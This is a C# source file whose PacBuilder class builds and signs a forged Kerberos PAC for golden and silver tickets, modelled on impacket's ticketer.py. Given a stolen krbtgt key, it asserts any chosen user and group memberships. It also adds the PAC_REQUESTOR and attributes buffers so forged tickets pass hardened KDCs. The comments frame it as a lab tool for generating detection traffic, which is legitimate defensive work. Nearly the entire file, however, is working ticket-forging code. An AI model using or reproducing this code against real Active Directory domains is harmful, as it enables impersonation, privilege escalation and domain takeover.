using System.Text;
using DotNetPacket.Core;

namespace DotNetPacket.Protocols.Krb5;

/// <summary>The identity a forged PAC asserts (the golden/silver-ticket logon claims).</summary>
public sealed record GoldenPacParams(
    string Username,
    uint UserRid,
    string DomainSid,
    string NetbiosDomain,
    uint PrimaryGroupId,
    IReadOnlyList<uint> GroupRids,
    uint UserAccountControl,
    DateTimeOffset LogonTime);

/// <summary>
/// Builds and signs a [MS-PAC] PAC for a forged Kerberos ticket — the mint side of <see cref="Pac"/>'s
/// parser, mirroring impacket's <c>ticketer.py</c> / <c>krb5.pac</c>. Produces PACTYPE + KERB_VALIDATION_INFO
/// (NDR type-serialization v1, field-for-field the layout <see cref="Pac.Parse"/> reads) + PAC_CLIENT_INFO,
/// then fills the SERVER and KDC/PRIVSVR checksums per [MS-KILE] 3.4.5.3: zero both signatures, HMAC the
/// whole PAC under the service key for the server signature, then HMAC that under the krbtgt key for the KDC
/// signature (for a golden ticket both keys are the krbtgt key). Lab-first: this is how a SOC generates
/// labelled golden/silver-ticket traffic to tune detections; it is not an evasion aid.
/// </summary>
public static class PacBuilder
{
    private const long Never = 0x7FFFFFFFFFFFFFFF;
    private const uint SeGroupDefault = 0x00000007; // MANDATORY | ENABLED_BY_DEFAULT | ENABLED
    private const uint AttributesInfoType = 17;     // PAC_ATTRIBUTES_INFO (MS-PAC 2.14)
    private const uint RequestorType = 18;          // PAC_REQUESTOR (MS-PAC 2.15)

    /// <summary>
    /// Builds the signed PAC. <paramref name="etype"/> is the krbtgt key's etype (it fixes the checksum
    /// algorithm); <paramref name="krbtgtKey"/> signs both the server and KDC checksums for a golden ticket.
    /// </summary>
    public static byte[] Build(GoldenPacParams p, int etype, byte[] krbtgtKey)
    {
        byte[] logonInfo = BuildLogonInfo(p);
        byte[] clientInfo = BuildClientInfo(p.Username, p.LogonTime);

        int checksumType = ChecksumTypeFor(etype);
        int sigLen = checksumType == Krb5Constants.Rc4HmacChecksumType ? 16 : 12;
        byte[] serverChecksum = SignatureBuffer(checksumType, sigLen);
        byte[] kdcChecksum = SignatureBuffer(checksumType, sigLen);

        // PAC_ATTRIBUTES_INFO (17) and PAC_REQUESTOR (18) are required by a modern (CVE-2022-37967-hardened)
        // Samba/AD KDC when it validates a client-supplied TGT; without PAC_REQUESTOR the TGS is rejected.
        byte[] attributesInfo = BuildAttributesInfo();
        byte[] requestor = BuildRequestor($"{p.DomainSid}-{p.UserRid}");

        // Assemble PACTYPE with zeroed signatures, then sign in place.
        var entries = new (uint Type, byte[] Data)[]
        {
            (Pac.LogonInfo, logonInfo),
            (Pac.ClientInfo, clientInfo),
            (AttributesInfoType, attributesInfo),
            (RequestorType, requestor),
            (Pac.ServerChecksum, serverChecksum),
            (Pac.PrivSvrChecksum, kdcChecksum),
        };

        byte[] pac = Assemble(entries, out int serverSigOffset, out int kdcSigOffset);

        // [MS-KILE] 3.4.5.3 / impacket sign_pac: server signature over the whole PAC (sigs zeroed) under
        // the service key, then the KDC signature over that server signature under the krbtgt key.
        byte[] serverSig = Krb5Cipher.Checksum(etype, krbtgtKey, 17, pac);
        Array.Copy(serverSig, 0, pac, serverSigOffset, serverSig.Length);
        byte[] kdcSig = Krb5Cipher.Checksum(etype, krbtgtKey, 17, serverSig);
        Array.Copy(kdcSig, 0, pac, kdcSigOffset, kdcSig.Length);

        return pac;
    }

    private static int ChecksumTypeFor(int etype) => etype switch
    {
        Krb5Constants.Aes256CtsHmacSha1 => Krb5Constants.HmacSha1Aes256ChecksumType,
        Krb5Constants.Aes128CtsHmacSha1 => Krb5Constants.HmacSha1Aes128ChecksumType,
        Krb5Constants.Rc4Hmac => Krb5Constants.Rc4HmacChecksumType,
        _ => throw new NotSupportedException($"Unsupported krbtgt key etype {etype} for PAC signing."),
    };

    // PAC_SIGNATURE_DATA (MS-PAC 2.8): SignatureType (int32) + Signature (zeroed; filled after assembly).
    private static byte[] SignatureBuffer(int type, int sigLen)
    {
        var w = new ByteWriter(ByteOrder.Little);
        w.WriteUInt32((uint)type);
        w.WriteBytes(new byte[sigLen]);
        return w.ToArray();
    }

    // PACTYPE header + 16-byte-per-entry buffer table + the 8-byte-aligned buffers. Returns the absolute
    // offsets of the server and KDC signature bytes (just past their 4-byte type field) for signing.
    private static byte[] Assemble(IReadOnlyList<(uint Type, byte[] Data)> entries, out int serverSigOffset, out int kdcSigOffset)
    {
        int headerLen = 8 + entries.Count * 16; // cBuffers + version + table
        var offsets = new int[entries.Count];
        int cursor = Align8(headerLen);

        var w = new ByteWriter(ByteOrder.Little);
        w.WriteUInt32((uint)entries.Count);
        w.WriteUInt32(0); // version

        for (int i = 0; i < entries.Count; i++)
        {
            offsets[i] = cursor;
            w.WriteUInt32(entries[i].Type);
            w.WriteUInt32((uint)entries[i].Data.Length);
            w.WriteUInt64((ulong)cursor);
            cursor = Align8(cursor + entries[i].Data.Length);
        }

        // Pad from the table end to the first buffer.
        while (w.Length < offsets[0])
        {
            w.WriteByte(0);
        }

        serverSigOffset = 0;
        kdcSigOffset = 0;
        for (int i = 0; i < entries.Count; i++)
        {
            while (w.Length < offsets[i])
            {
                w.WriteByte(0);
            }

            if (entries[i].Type == Pac.ServerChecksum) serverSigOffset = offsets[i] + 4;
            else if (entries[i].Type == Pac.PrivSvrChecksum) kdcSigOffset = offsets[i] + 4;
            w.WriteBytes(entries[i].Data);
        }

        return w.ToArray();
    }

    // PAC_ATTRIBUTES_INFO (MS-PAC 2.14): FlagsLength (bits used) + Flags. PAC_WAS_REQUESTED (bit 0).
    private static byte[] BuildAttributesInfo()
    {
        var w = new ByteWriter(ByteOrder.Little);
        w.WriteUInt32(2); // FlagsLength (2 bits)
        w.WriteUInt32(1); // Flags = PAC_WAS_REQUESTED
        return w.ToArray();
    }

    // PAC_REQUESTOR (MS-PAC 2.15): the requesting account's SID as a raw (non-NDR) SID.
    private static byte[] BuildRequestor(string userSid)
    {
        var w = new ByteWriter(ByteOrder.Little);
        WriteRawSid(w, userSid);
        return w.ToArray();
    }

    // PAC_CLIENT_INFO (MS-PAC 2.7): ClientId (FILETIME, the auth time) + NameLength (u16) + Name (UTF-16).
    private static byte[] BuildClientInfo(string username, DateTimeOffset authTime)
    {
        byte[] name = Encoding.Unicode.GetBytes(username);
        var w = new ByteWriter(ByteOrder.Little);
        w.WriteUInt64((ulong)ToFileTime(authTime));
        w.WriteUInt16((ushort)name.Length);
        w.WriteBytes(name);
        return w.ToArray();
    }

    // KERB_VALIDATION_INFO as NDR type-serialization v1 — the exact layout Pac.ParseLogonInfo reads.
    private static byte[] BuildLogonInfo(GoldenPacParams p)
    {
        var body = new ByteWriter(ByteOrder.Little);
        uint refId = 0x00020000;
        uint NextRef() { uint r = refId; refId += 4; return r; }

        uint effRef = NextRef(), fullRef = NextRef(), scriptRef = NextRef(),
             profRef = NextRef(), homeRef = NextRef(), homeDrvRef = NextRef();
        uint groupRef = NextRef();
        uint srvRef = NextRef(), domRef = NextRef();
        uint domainIdRef = NextRef();

        body.WriteUInt32(NextRef()); // root referent (non-null pointer to the structure)

        // --- fixed part (parser order) ---
        long now = ToFileTime(p.LogonTime);
        WriteFileTime(body, now);     // LogonTime
        WriteFileTime(body, Never);   // LogoffTime
        WriteFileTime(body, Never);   // KickOffTime
        WriteFileTime(body, now);     // PasswordLastSet
        WriteFileTime(body, now);     // PasswordCanChange
        WriteFileTime(body, Never);   // PasswordMustChange

        WriteStrHeader(body, p.Username, effRef);  // EffectiveName
        WriteStrHeader(body, p.Username, fullRef); // FullName
        WriteStrHeader(body, string.Empty, scriptRef);
        WriteStrHeader(body, string.Empty, profRef);
        WriteStrHeader(body, string.Empty, homeRef);
        WriteStrHeader(body, string.Empty, homeDrvRef);

        body.WriteUInt16(0);                       // LogonCount
        body.WriteUInt16(0);                       // BadPasswordCount
        body.WriteUInt32(p.UserRid);               // UserId
        body.WriteUInt32(p.PrimaryGroupId);        // PrimaryGroupId
        body.WriteUInt32((uint)p.GroupRids.Count); // GroupCount
        body.WriteUInt32(groupRef);                // Groups referent
        body.WriteUInt32(0);                       // UserFlags
        body.WriteBytes(new byte[16]);             // UserSessionKey

        WriteStrHeader(body, string.Empty, srvRef);        // LogonServer
        WriteStrHeader(body, p.NetbiosDomain, domRef);     // LogonDomainName
        body.WriteUInt32(domainIdRef);                     // LogonDomainId referent
        body.WriteBytes(new byte[8]);                      // LMKey / Reserved1
        body.WriteUInt32(p.UserAccountControl);            // UserAccountControl
        body.WriteUInt32(0);                               // SubAuthStatus
        WriteFileTime(body, 0);                            // LastSuccessfulILogon
        WriteFileTime(body, 0);                            // LastFailedILogon
        body.WriteUInt32(0);                               // FailedILogonCount
        body.WriteUInt32(0);                               // Reserved3
        body.WriteUInt32(0);                               // SidCount
        body.WriteUInt32(0);                               // ExtraSids referent (none)
        body.WriteUInt32(0);                               // ResourceGroupDomainSid referent
        body.WriteUInt32(0);                               // ResourceGroupCount
        body.WriteUInt32(0);                               // ResourceGroupIds referent

        // --- deferred referents (same order) ---
        WriteStrBuffer(body, p.Username);
        WriteStrBuffer(body, p.Username);
        WriteStrBuffer(body, string.Empty);
        WriteStrBuffer(body, string.Empty);
        WriteStrBuffer(body, string.Empty);
        WriteStrBuffer(body, string.Empty);

        body.WriteUInt32((uint)p.GroupRids.Count);         // Groups: conformant MaxCount
        foreach (uint rid in p.GroupRids)
        {
            body.WriteUInt32(rid);
            body.WriteUInt32(SeGroupDefault);
        }

        WriteStrBuffer(body, string.Empty);                // LogonServer buffer
        WriteStrBuffer(body, p.NetbiosDomain);             // LogonDomainName buffer
        WriteSid(body, p.DomainSid);                       // LogonDomainId

        byte[] ndr = body.ToArray();

        // Type-serialization v1: CommonTypeHeader(8) + PrivateHeader(8: ObjectBufferLength + filler) + NDR.
        var w = new ByteWriter(ByteOrder.Little);
        w.WriteBytes(new byte[] { 0x01, 0x10, 0x08, 0x00, 0xCC, 0xCC, 0xCC, 0xCC }); // version 1, LE, hdrlen 8
        w.WriteUInt32((uint)ndr.Length);  // ObjectBufferLength
        w.WriteUInt32(0);                 // filler
        w.WriteBytes(ndr);
        return w.ToArray();
    }

    // RPC_UNICODE_STRING header: Length (bytes used), MaximumLength, Buffer referent.
    private static void WriteStrHeader(ByteWriter w, string s, uint referent)
    {
        ushort bytes = (ushort)(s.Length * 2);
        w.WriteUInt16(bytes);
        w.WriteUInt16(bytes);
        w.WriteUInt32(referent);
    }

    // Deferred conformant-varying wchar buffer: MaxCount, Offset(0), ActualCount, chars, align4.
    private static void WriteStrBuffer(ByteWriter w, string s)
    {
        w.WriteUInt32((uint)s.Length); // MaxCount
        w.WriteUInt32(0);              // Offset
        w.WriteUInt32((uint)s.Length); // ActualCount
        if (s.Length > 0)
        {
            w.WriteBytes(Encoding.Unicode.GetBytes(s));
            Align4(w);
        }
    }

    // RPC_SID (conformant): max_count(SubAuthorityCount), Revision, SubAuthorityCount, IdentifierAuthority(6 BE), SubAuthorities.
    private static void WriteSid(ByteWriter w, string sid)
    {
        string[] parts = sid.Split('-');
        // parts[0]="S", [1]=revision, [2]=identifier authority, [3..]=sub authorities
        byte revision = byte.Parse(parts[1]);
        ulong authority = ulong.Parse(parts[2]);
        uint[] subs = parts[3..].Select(uint.Parse).ToArray();

        w.WriteUInt32((uint)subs.Length); // conformant max_count
        w.WriteByte(revision);
        w.WriteByte((byte)subs.Length);
        for (int i = 5; i >= 0; i--)
        {
            w.WriteByte((byte)(authority >> (8 * i))); // 48-bit big-endian authority
        }

        foreach (uint s in subs)
        {
            w.WriteUInt32(s);
        }
    }

    // A raw MS-DTYP SID (no NDR conformant prefix): Revision, SubAuthorityCount, IdentifierAuthority(6 BE), SubAuthorities.
    private static void WriteRawSid(ByteWriter w, string sid)
    {
        string[] parts = sid.Split('-');
        byte revision = byte.Parse(parts[1]);
        ulong authority = ulong.Parse(parts[2]);
        uint[] subs = parts[3..].Select(uint.Parse).ToArray();

        w.WriteByte(revision);
        w.WriteByte((byte)subs.Length);
        for (int i = 5; i >= 0; i--)
        {
            w.WriteByte((byte)(authority >> (8 * i)));
        }

        foreach (uint s in subs)
        {
            w.WriteUInt32(s);
        }
    }

    private static void WriteFileTime(ByteWriter w, long ft)
    {
        w.WriteUInt32((uint)(ft & 0xFFFFFFFF));
        w.WriteUInt32((uint)((ulong)ft >> 32));
    }

    private static long ToFileTime(DateTimeOffset dt) =>
        (dt.UtcDateTime - new DateTime(1601, 1, 1, 0, 0, 0, DateTimeKind.Utc)).Ticks;

    private static void Align4(ByteWriter w)
    {
        while (w.Length % 4 != 0)
        {
            w.WriteByte(0);
        }
    }

    private static int Align8(int v) => (v + 7) & ~7;
}
